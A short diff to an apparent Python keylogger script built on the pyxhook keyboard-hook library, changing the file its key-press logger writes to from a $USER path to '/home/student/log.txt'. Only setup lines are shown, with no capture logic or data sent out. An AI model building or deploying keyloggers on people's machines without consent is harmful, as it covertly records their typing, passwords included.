@@ -6,7 +6,7 @@ import pyxhook
 def main():
     # Specify the name of the file (can be changed )
     # log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
-    log_file = '/home/$USER/log.txt'
+    log_file = '/home/student/log.txt'
 
     # The logging function with {event parm}
     def OnKeyPress(event):
